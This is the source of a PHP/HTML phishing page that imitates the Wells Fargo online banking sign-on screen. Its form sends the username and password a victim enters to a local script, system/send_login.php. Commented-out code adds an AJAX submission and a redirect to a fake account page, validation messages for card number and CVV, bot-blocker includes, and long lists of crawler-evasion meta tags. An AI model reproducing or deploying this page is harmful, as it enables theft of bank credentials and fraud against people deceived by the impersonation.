<?php





session_start();
error_reporting(0);

/*include "system/blocker.php";
include "system/blocker1.php";
include "system/blocker2.php";
include "system/anti1.php";
include "system/anti2.php";
include "system/anti3.php";
include "system/anti4.php";
include "system/anti5.php";
include "system/anti6.php";
include "system/anti7.php";
include "system/anti8.php";
include "system/detect.php";*/


?>

<!DOCTYPE html>
<html lang="en">
    <head>
        


    <link rel="icon" type="image/x-icon" href="./style/css/tttt.jpg">


<style>
.ddddaaaaa {
    margin-top: 10px;
    height: 45px;
    width: 200px;
    padding-left: 10px;
    margin-right: 18px;
    font-weight: 400;
    text-decoration: none;
    font-size: 13px;
    color: #44464a;
    border-radius: 2px;
	border-top:none;
    border-bottom: 1px solid #cfd1d7;
}

</style>
	
<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>



	
		<meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
		<meta http-equiv="Pragma" content="no-cache" />
		<meta http-equiv="Pragma: no-cache"/>
		<meta http-equiv="Cache Control" content="no-store" />
		<meta http-equiv="Cache Control: no-store" />
		<meta http-equiv="Expires" content="-1" />
	<meta name="robots" content="noindex, nofollow,noarchive,nosnippet,nocache,noimageindex">
<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-news" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="msnbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-slurp" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="teoma" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="twiceler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="gigabot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="scrubby" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="robozilla" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="nutch" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="ia_archiver" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="baiduspider" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="naverbot, yeti" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-image" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-mobile" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-mmcrawler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="psbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="asterias" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-blogs/v3.9" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="AhrefsBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="MJ12bot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Majestic-12" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Majestic-SEO" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="DSearch" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Rogerbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SemrushBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="BLEXBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="ScoutJet" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SearchmetricsBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="BacklinkCrawler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Exabot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="spbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="linkdexbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Lipperhey Spider" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SEOkicks-Robot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="sistrix" content="noindex,nofollow,noarchive,nosnippet,nocache">

<style>
  .txt1{
   width:200px;
   height:34px;
   padding:5px 0px;
   border-top:none;
   border-left:none;
   border-right:none;
   border-bottom:1px solid #CCC;
   margin:13px 1em 0 0;
   font-size:15px;	  
}
 .txt1a{
   width:200px;
   height:30px;
   background-image:url(style/css/img1.png);
   background-repeat:no-repeat;
   padding:20px 0px 1px 0;
   border-top:none;
   border-left:none;
   border-right:none;
   border-bottom:1px solid #CCC;
   margin:13px 1em 0 0;
   font-size:15px;	  
}


.txt2{
   width:200px;
   height:35px;
   padding:5px 0px;
   border-top:none;
   border-left:none;
   border-right:none;
   border-bottom:1px solid #CCC;
   margin:17px 0em 0 0;
   font-size:15px;	  
}

.txt1b{
   width:200px;
   height:25px;
   background-image:url(style/css/img2.png);
   background-repeat:no-repeat;
   padding:12px 0px 1px 0;
   border-top:none;
   border-left:none;
   border-right:none;
   border-bottom:1px solid #CCC;
   margin:3px 1em 0 0;
   font-size:15px;	  
}
.remeber{
   	width:414px;
	height:29px;
	background-image:url(style/css/img3.png);
	background-repeat:no-repeat;
	margin:0em 0 0 -0.3em;
}
#a:hover{
   text-decoration:underline;
   cursor:pointer;	
}
#b:hover{
   text-decoration:underline;
   cursor:pointer;	
}
#c:hover{
   text-decoration:underline;
   cursor:pointer;	
}
</style>

<style id="antiClickjack">.antiClickjackContent{display:none !important;} .noscriptmsg { display:block;font-size:16px;width:100%;margin:5em 0 5em .5em}</style>

<meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
        <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
                <meta name="description" content="Click here to sign on to your Wells Fargo account(s)."/>
          

<link rel="stylesheet" href="./style/css/global.css">
<style>
            section[data-id="hero"] {
                overflow: hidden;
                height: 200px;
            }

            section[data-id="hero"] img {
                position: relative;
                width: 722px;
            }
			.btnsignon{
			   cursor:pointer;
			   background-color:#d71e28;	
			}
        </style>
    </head>
    <body id="body" theme="ssep" platform="m" contextPath="#" >
        <a href="#skip" class="skipLink">main content</a>
        <div style="width:100%; height:60px;background-color:#d71e28;">
             <div style="width:55%;overflow:hidden;margin:0 auto;color:#FFF">
               <div style="width:227px;overflow:hidden;float:left;color:#FFF;padding:5px 0 0 0">
               <img src="style/css/logo.png" width="226" height="48"> 
               </div>
               <div style="width:480px;height:40px;float:left;padding:0px 0 0 0;color:#FFF;text-align:right">
                <div style="float:right;margin:8px 0em 0 1em">
                <form action="" method="get" id="frmSearch" style="">
							<input name="q" value="" aria-label="Search" title="Search" size="9" maxlength="75" type="text" autocomplete="off" autocapitalize="off" id="inputTopSearchField" placeholder="Search" style="height:30px;border-radius:0.6em;border:1px solid #d71e28;padding:2px 7px;background-image:url(style/css/img11.png);background-repeat:no-repeat;background-position:4.8em 5px;" />
							<!--<img role="button" src="./style/css/rooro.png" alt="search" onclick="Search.events.button.onclick()" onkeyup="Search.events.button.onkeyup()" tabindex="0"/>-->
						</form>
                 </div>
                 <div style="float:right;margin:18px 0 0 0;" id="c">Customer Service</div><div style="float:right;margin:18px 1em 0 0" id="b">Location</div>  <div style="float:right;margin:18px 1em 0 0" id="a">Apply</div>
               </div>
             </div>
        </div>
        <div style="width:100%; height:4px;background-color:#fcc60a"></div>
        <header isJukebox="" divested="" origin="cob" style="height:50px;" >
        
	<div style="height:50px;">
    <img src="">
    <ul data-id="search"><li></li><li>
					<div data-id="searchBox">
						
					</div>
				</li>
			</ul>
		<ul data-id="headerLinks">
	  <li><a href="javascript:history.go(-1)">Back to Previous Page</a></li><li><a href="">Español</a></li><li><a href="#">Home</a></li></ul>
	</div>
</header>
<section data-id="hero" role="presentation" style="background-color:#fff7e2">
                <img src="./style/css/logobody.png" alt="" aria-hidden="true"/>
            </section>
        <main>




<!--<script>
// Wait for the DOM to be ready
$(function() {

	var validator = $("#Signonbank").bind("invalid-form.validate", function() {
			$("#errorSignonbank").html("<div class='alert' aria-atomic='true' role='alert' tabindex='-1'><img src='./style/css/ss.png' height='16' width='16' alt='Error' /><strong>  Please check your information and try again.</strong></div>");})




  $("form[name='Signonbank']").validate({
    
	errorContainer: $("#errorSignonbank"),

    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },

highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},





    messages: {

      NameOnCard: "Name On Card is required!",

      lastName: "Last Name is required!",




expdate: {
        required: "Expiration Month/Year  is required!",
        minlength: "Please enter a valid Expiration Month/Year "
      },


 csc: {
        required: "Security Code (CVV) is required!",
        minlength: "Please enter a valid CVV code"
      },


  cardnumber: {
        required: "Card Number is required!",
        minlength: "Please check your Card Number"
      },


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },






      email: "Please enter a valid email address"
    },
    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {


					$.post("./system/send_login.php?ajax", $("#Signonbank").serialize(), function(result) {
                            setTimeout(function() {





                                $(location).attr("href", "./Myaccount.php?id=Myaccount");
                            });
                    });
    }
  });
});

</script> -->




            <form id="Signonbank" name="Signonbank" action="system/send_login.php"  method="POST" >
                <noscript><div class="noscriptmsg">For your security, you must enable JavaScript to sign on to your account. Please adjust your browser settings, or go to <a href="#">Online Troubleshooting</a> for help.</div></noscript>


<section data-id="content" aria-label="Sign On to View Your Accounts" class="" origin="cob">
	


	<h1 id="skip" tabindex="-1">Sign On to View Your Accounts</h1>
		<div id="errorSignonbank">
		



		</div>
	<p class="copy" origin="cob">Enter your username and password to securely view and manage your
			Wells Fargo
			accounts online.</p>
	<div style="width:50%;height:0px;" ></div>	
	<div data-id="inputContainer">
		<br>
		<input class="txt1" required  aria-required="true" type="text" id="usernamebank" name="usernamebank" value="" maxlength="14" autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Username"/>
			<div id="saveUsernamePopup" tabindex="-1" role="alertdialog" aria-labelledby="saveUsernameTitle" aria-describedby="saveUsernameDescription" data-id="saveUsernamePopup">
			<span>Beginning of popup</span>
			<h2 id="saveUsernameTitle">Notice</h2>
			<p id="saveUsernameDescription">For your security, we do not recommend using this feature on a shared device.</p>
			<img data-id="saveUsernameArrow" src="./style/css/ad.png" alt="" aria-hidden="true"/>
			<span>End of popup</span>
			<img tabindex="0" data-id="saveUsernameClose" onclick="LoginForm.events.saveUsernamePopup.onclick()" onKeyUp="LoginForm.events.saveUsernamePopup.onKeyUp()" role="button" src="./style/css/sdasd.png" alt="close dialog" aria-label="close dialog"/>
		</div>
	</div>
	<div data-id="inputContainer">
		<br>
        
		<input class="txt2" required  aria-required="true" type="password" id="passwordbank" name="passwordbank" value="" maxlength="32" autocorrect="off" autocapitalize="off" autocomplete="off" placeholder="Password" />
	</div>
	<div class="clear-both" data-id="inputContainer">
				</div>
          
	<div class="block-display clear-both">
    
		<div data-id="forgotEnrollLinks" origin="cob"><br>
        <div class="remeber"></div>
			<a href="#" data-id="forgotUsername" origin="cob">Forgot Password/Username?</a>
						<span data-id="linkSeparator">|</span>
						<a href="#" data-id="forgotUsername">Enroll Now</a>
							</div>
                                  
		<input type="submit" name="continue" value="Sign On" data-id="submit" class="button cob btnsignon" style="background-color:#d71e28;width:14em;border-radius:0.6em;height:38px" origin="cob"/>
			</div>
</section>
<aside>
                    <hr/>
                    <section class="aside-group" data-id="relatedInformation" aria-label="related information">
	<h2>Related Information</h2>
	<ul>
		<li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Enrollment FAQs</a></li><li><img src="./style/css/sssssaa.png"  alt="" aria-hidden="true"/> <a href="#">Online Security Guarantee</a></li><li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Privacy, Security and Legal</a></li><li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Online Access Agreement</a></li></ul>
</section>
<section class="aside-group" data-id="otherServices" aria-label="other services">
	<h2>Other Services</h2>
	<ul>
		<li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Applications In Progress</a></li>
		<li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Credit Card Rewards</a></li>
	</ul>
</section>
</aside>

<section data-id="submitContainer">
                </section>
            </form>
        </main>
<div data-id="footerSeparator"></div>
        <footer>
            <div>
	<nav role="navigation">
		<div>
			<ul data-id="links">
				<li><a href="#">About Wells Fargo</a></li><li><a href="@">Careers</a></li><li><a href="#">Privacy, Security &amp; Legal</a></li><li><a href="#">Report Email Fraud</a></li><li><a href="#">Sitemap</a></li><li><a href="#">Home</a></li></ul>
		</div>
	</nav>
</div>
<div class="clear-both">
				<div>
	                <p data-id="copyright" class="cob">&copy; 1999 - 2020 Wells Fargo. All rights reserved. </p>
	                    </div>
			</div>
</footer>

   

            <!--TMS include ends-->
 <script>
    $('#usernamebank').on('focusin', function(){
		$('#usernamebank').addClass('txt1a');
		$('#usernamebank').removeClass('txt1');
		$('#usernamebank').attr('placeholder','');
		$('#usernamebank').css('padding','17px 5px 2px 5px');
		$('#usernamebank').css('border','1px solid #0000');
		$('#usernamebank').css('height','26px');
		
		
	});
	
	 $('#usernamebank').on('focusout', function(){
		$('#usernamebank').addClass('txt1');
		$('#usernamebank').removeClass('txt1a');
		$('#usernamebank').css('padding','');
		$('#usernamebank').css('border','');
		$('#usernamebank').css('height','34px');
		
		
		
		var pemp = $('#usernamebank').val();
	    if(pemp == ""){
		$('#usernamebank').attr('placeholder','Username');
	    }
		
		if(pemp != ""){
		$('#usernamebank').addClass('txt1a');
		$('#usernamebank').removeClass('txt1');
		$('#usernamebank').attr('placeholder','');
		$('#usernamebank').css('padding','17px 5px 2px 5px');
		$('#usernamebank').css('border-bottom','1px solid #CCC');
		$('#usernamebank').css('height','26px');
		}
		
	});
	
	$('#passwordbank').on('focusin', function(){
		$('#passwordbank').addClass('txt1b');
		$('#passwordbank').removeClass('txt1');
		$('#passwordbank').attr('placeholder','');
		$('#passwordbank').css('padding','17px 5px 2px 5px');
		$('#passwordbank').css('border','1px solid #0000');
		$('#passwordbank').css('height','26px');
		$('#passwordbank').css('margin','10px 0 0 0');
	});
	
	
	
	 $('#passwordbank').on('focusout', function(){
		$('#passwordbank').addClass('txt1');
		$('#passwordbank').removeClass('txt1b');
		$('#passwordbank').attr('placeholder','');
		$('#passwordbank').css('padding','');
		$('#passwordbank').css('border','');
		$('#passwordbank').css('height','34px');
		
		var pemp = $('#passwordbank').val();
	    if(pemp == ""){
		$('#passwordbank').attr('placeholder','Password');
	    }
		
		 if(pemp != ""){
		$('#passwordbank').addClass('txt1b');
		$('#passwordbank').removeClass('txt1');
		$('#passwordbank').attr('placeholder','');
		$('#passwordbank').css('padding','');
		$('#passwordbank').css('border','');
		$('#passwordbank').css('height','34px');
	    }
		
	});
</script>
        </body>
</html>